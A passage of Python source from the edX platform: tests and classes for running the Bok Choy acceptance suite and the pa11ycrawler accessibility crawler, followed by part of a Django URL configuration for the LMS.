    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, "")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')                    
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """
        expected_verbosity_string = (
            "--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """
        process_count = 2
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """
        With the above test, validate that num_processes can be set to various values
        """
        process_count = 3
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """
        Returns the expected command to run pa11ycrawler.
        """
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter="1.0-json" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])

"""
Class used for defining and running Bok Choy acceptance test suite
"""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / "xunit.xml"
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))                    
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', "Checking for mongo, memchache, and mysql...")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', "Confirming servers have started...")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', "Cleaning up databases...")
            print msg
            sh("./manage.py lms --settings bok_choy flush --traceback --noinput")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct "multiprocess" nosetest substring
            substring = [
                "--with-xunitmp --xunitmp-file={}".format(self.xunit_report),
                "--processes={}".format(self.num_processes),
                "--no-color --process-timeout=1200"
            ]

        else:
            substring = [
                "--with-xunit",
                "--xunit-file={}".format(self.xunit_report),
                "--verbosity={}".format(self.verbosity),
            ]

        return " ".join(substring)

    def prepare_bokchoy_run(self):
        """
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """
        sh("{}/scripts/reset-test-db.sh".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', "Confirming servers are running...")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """
        msg = colorize('green', "Importing courses from {}...".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                "DEFAULT_STORE={default_store}"
                " ./manage.py cms --settings=bok_choy import {import_dir}".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """
        Loads data into database from db_fixtures
        """
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            "DEFAULT_STORE={default_store}"
            " ./manage.py lms --settings bok_choy loaddata --traceback"
            " common/test/db_fixtures/*.json".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print "Stopping bok-choy servers.\n"
                break

    @property
    def cmd(self):
        """
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return ""

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            "DEFAULT_STORE={}".format(self.default_store),
            "SCREENSHOT_DIR='{}'".format(self.log_dir),
            "BOK_CHOY_HAR_DIR='{}'".format(self.har_dir),
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'".format(self.a11y_file),
            "SELENIUM_DRIVER_LOG_DIR='{}'".format(self.log_dir),
            "VERIFY_XSS='{}'".format(self.verify_xss),
            "nosetests",
            test_spec,
            "{}".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append("--pdb")
        if self.save_screenshots:
            cmd.append("--with-save-baseline")
        cmd.append(self.extra_args)

        cmd = (" ").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = "https://github.com/edx/demo-test-course/archive/master.tar.gz"

        self.start_urls = []
        auto_auth_params = {
            "redirect": 'true',
            "staff": 'true',
            "course_id": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8031/auto_auth?{}\"".format(cms_params))

        sequence_url = "/api/courses/v1/blocks/?{}".format(
            urlencode({
                "course_id": self.course_key,
                "depth": "all",
                "all_blocks": "true",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8003/auto_auth?{}\"".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """
        Fetches the test course.
        """
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', "Fetching the test course from github...")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', "Uncompressing the test course...")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """
        Runs pa11ycrawler json-to-html
        """
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """
        Runs pa11ycrawler as staff user against the test course.
        """
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter="{reporter}" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter="1.0-json",
            dont_go_here="logout",
            depth="6",
        )
        return cmd_str

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index'),                    
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
